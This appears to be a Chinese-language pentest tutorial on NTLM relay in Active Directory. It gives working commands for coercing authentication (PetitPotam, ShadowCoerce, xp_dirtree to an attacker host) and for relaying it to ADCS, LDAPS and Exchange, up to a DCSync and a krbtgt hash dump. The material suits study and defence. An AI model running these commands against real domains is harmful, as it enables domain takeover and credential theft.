# NTLM Relay


**本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文：**

[The NTLM Authentication Protocol and Security Support Provider](http://davenport.sourceforge.net/ntlm.html)

[NTLM 篇 - windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian)

[NTLM Relay - hackndo](https://en.hackndo.com/ntlm-relay/)

本篇主要围绕下图进行。[来自](https://en.hackndo.com/ntlm-relay/)

![NTLM relay.drawio.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png "https://www.thehacker.recipes/ad/movement/ntlm/relay")


原理直接看国外老哥写的这篇文章[NTLM RELAY](https://en.hackndo.com/ntlm-relay/)。本文主要讲Relay的一些路径。

## 触发NTLM认证。

### SMB

#### PetitPotam（MS-EFSR）

https://github.com/topotam/PetitPotam

> MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
>
> MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
>

如果机器开启lsarpc的匿名访问。即可在不知道账户密码的情况下触发强制身份认证。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png)


#### PrinterBug（MS-RPRN）

https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py

> Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。  
> 强制身份验证通过 SMB 进行。  
> 上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
>

#### ShadowCoerce (MS-FSRVP)

> MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。  
> **滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。**
>

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217172953-wkxtvu0.png)

https://github.com/ShutdownRepo/ShadowCoerce

```shell
python3 shadowcoerce.py -d "adc.com" -u "mssql" -p "song@2020" 10.10.10.123 10.10.10.15
```


#### Sql Server

```bash
exec master.dbo.xp_dirtree '\\10.10.10.123\test'

```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220216172606-1f7ugw9.png)

目标机器安装webclient时，可通过指定端口触发http类型认证。

```bash
exec master.dbo.xp_dirtree '\\kali@80/test' --http

https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247484864&idx=1&sn=94260cb4a4e643764f4cfd3565ae799b
xp_dirtree '\\hostname@SSL\test' --ssl 443
xp_dirtree '\\hostname@SSL@1234\test' --ssl port 1234
xp_dirtree '\\hostname@1234\test' --http
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217174751-z98aqxm.png)

### HTTP

#### WEBDAV

在开启`webclient`（需要安装`webdav`，开启`webclient`）时，可结合`PetitPotam` 、`PinterBug`发出HTTP的认证

[安装webdav与开启webclient参考链接](https://theitbros.com/installing-webdav-client-windows-server-2016/](https:/theitbros.com/installing-webdav-client-windows-server-2016/)

```bash
外发HTTP类型认证需要在可信域中，所以需要在域内添加一条DNS记录。或者端口转发域内机器

Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211203153907-ba1w2rr.png)


还有A-TEAM大哥们提到的WEBDAV XXE

https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#41-webdav-xxe

#### WPAD配合DHCPv6

[https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x09-wpad-he-mitm6](https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x09-wpad-he-mitm6)

https://github.com/Kevin-Robertson/Inveigh

https://www.bettercap.org/installation/

https://github.com/dirkjanm/mitm6

```bash
Inveigh.exe -spooferip 192.168.52.129
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png)

#### 邮件钓鱼

outlook与foxmail 图片预览功能支持HTTP和UNC路径，可触发SMB和http类型认证。

获取HTTP需要在可信域，需要添加一条DNS记录。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124509-c70vna4.png)

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124644-68e0j3a.png)


#### XXE与SSRF

https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x0a-xxe-and-and-ssrf

> 各个语言触发XXE和SSRF的实现不同。同一门语言也有不同的触发方式，
>
> 只要支持UNC路径都能打回net-ntlm hash,如果支持http的话，得看底层实现，有些底层实现是需要判断是否在信任域的，有些底层实现是不需要判断是否信任域，有些需要判断是否信任域里面。
>
> 在xxe和ssrf测试中一般要测试这两个方面
>
> 1. 支不支持UNC路径，比如`\\ip\x`或者`file://ip/x`
> 2. 支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的
>

#### Exchange SSRF

https://daiker.gitbook.io/windows-protocol/ntlm-pian/7#4.-cve-2018-8581


## 域内机器的签名情况

我们可以在 **Windows管理工具-本地安全策略-本地策略-安全选项** 中查看

### LDAP

LDAP一般只安装在域控上，默认是协商签名而非强制签名。

* 即当relay时SMB签名开启或者强制签名时：需要签名
* 当SMB签名关闭（SMBv1）或者HTTP的流量时：不需要签名

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210162244-k7o78qe.png)

### SMB

域控：作为server端，域控默认是强制SMB签名的。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160625-uh5gccn.png)


域内普通机器：作为客户端，默认不开强制签名，默认为Enabled。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160938-g8l0lfw.png)


## Relay To？

**ADC.com**

* 10.10.10.10 域控
* 10.10.10.14 ADCS
* 10.10.10.16 Exchange
* 10.10.10.12 普通域内机器

**DDC.com**

* 10.10.10.20 域控
* 10.10.10.21 Exchange

### ADCS ESC8

定位ADCS服务器：

```bash
certutil -config - -ping

```

利用

```bash
python3 ntlmrelayx.py -t http://10.10.10.14/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215111530-1sxziik.png)


```bash
Rubeus.exe asktgt /user:WIN-8NUIJ5CPB71$ /certificate:base64cert /domain:adc.com /dc:10.10.10.10 /ptt
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215113343-0zmelch.png)

mimikatz

```bash
lsadump::dcsync /all
```

### Cred Dump

敬请期待

[https://github.com/SecureAuthCorp/impacket/pull/1253](https://github.com/SecureAuthCorp/impacket/pull/1253)


### EXEC

```bash
python3 ntlmrelayx.py -t smb://10.10.10.15 --remove-mic -c whoami
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219230123-oqwtqjn.png)

### 枚举信息

```bash
python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --remove-mic
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219231301-lkb12xc.png)

### 创建用户（LDAPS）

1. **添加机器账户**：

域有个属性`ms-DS-MachineAccountQuota` 他标志着非特权用户最多添加多少机器账户到域内。默认为10。

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219233947-j2x8khq.png)

```bash
python3 ntlmrelayx.py -t ldaps://10.10.10.10 --add-computer testpc$ --remove-mic
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png)

2. **添加普通用户**

需要高权限账户（比如说域管）才可以，

```bash
python3 ntlmrelayx.py -t ldaps://10.10.10.10 --remove-mic
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png)

### Exchange

**存在CVE-2019-1040漏洞的情况下，可以从SMB->LDAP(s)。而无需考虑签名的情况。**

Exchange的机器账户是域内高权账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE：

* 复制目录更改
* 复制目录更改所有项

这样该用户就具备了Dcsync权限，从而可以导出域内所有用户Hash。

当exchange存在SSRF漏洞([CVE-2018-8581](https://github.com/dirkjanm/PrivExchange))时。可触发http类型的NTLM认证。不需要考虑签名问题。

```bash
python3 privexchange.py -d ddc.com -u test1 -p song@2020 -ah 10.10.10.123  10.10.10.21
```

**等待一分钟**

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170012-z0eknwi.png)

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170234-76xooxz.png)


没有SSRF时，可通过触发SMB类型流量结合CVE-2019-1040移除MIC完整型检验.

```bash
python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --escalate-user wukong --remove-mic
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192302-hbl2q2j.png)

```bash
python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -debug -just-dc-user krbtgt

```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png)

### 影子凭证（Shadow Credentials）

1. 隐蔽权限维持。

> 常规Kerberos预认证阶段（pre-auth），客户端用自己的hash加密时间戳给KDC。KDC使用该用户的hash解密，验证通过后返回该用户的TGT。这是对称加密（DES、RC4、AES128、AES256）。Kerberos也支持非对称的认证方式，通过证书（PKINIT）或密钥对实现。需要安装ADCS。​
>

> Microsoft 还引入了密钥信任的概念，以在不支持证书信任的环境中支持无密码身份验证。在 Key Trust 模型下，PKINIT 身份验证是基于原始密钥数据而不是证书建立的。
>

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")

简单来说就是客户端有自己的一对密钥，KDC也存着用户的公钥。使用私钥加密预认证信息发给KDC，KDC使用用户的公钥解密，验证通过返回TGT。

Windows server2016引进了一个属性`msDS-KeyCredentialLink`。

> 该属性的值是 Key Credentials，它是包含创建日期、所有者可分辨名称等信息的序列化对象，一个代表设备 ID 的 GUID，当然还有公钥。这是一个多值属性，因为一个帐户有多个链接设备。
>

我的理解：我们伪造一个密钥对，通过修改msDS-KeyCredentialLink为我们伪造的公钥，AS_REQ发送伪造的公钥和伪造私钥加密的时间戳，KDC验证AS_REQ中的公钥和msDS-KeyCredentialLink的公钥，然后再用公钥解密。验证通过后返回TGT。

**利用**：

首先需要给一个机器新增msDS-KeyCredentialLink。机器账户可以给自己新增。高权限账户可以给其他账户新增。

```bash
python3 pywhisker.py -d "adc.com" -u "administrator" -p "sss@123" --target "yangguo" --action "list"  --dc-ip 10.10.10.10
```

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145731-unvrfbi.png)

第一次大概率会遇到下面的错误。需要去域控上注册证书。

[FAS - Request not supported while launching a published Desktop with FAS](https://support.citrix.com/article/CTX218941)

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145622-2sqt1ax.png)


**获取hash**：原理看下面这段话

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab")

![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png)

2. **结合NTLM Relay**

[https://github.com/SecureAuthCorp/impacket/pull/1249](https://github.com/SecureAuthCorp/impacket/pull/1249)

> 用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。  
> 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。
>

### RBCD（低权限）

当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。


## 参考

[Relay - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ntlm/relay)

[NTLM 篇 - windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian)

[[域渗透] SQLSERVER 结合中继与委派](https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247484864&idx=1&sn=94260cb4a4e643764f4cfd3565ae799b)

[安全研究 | 使用PetitPotam代替Printerbug](https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ)

[Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

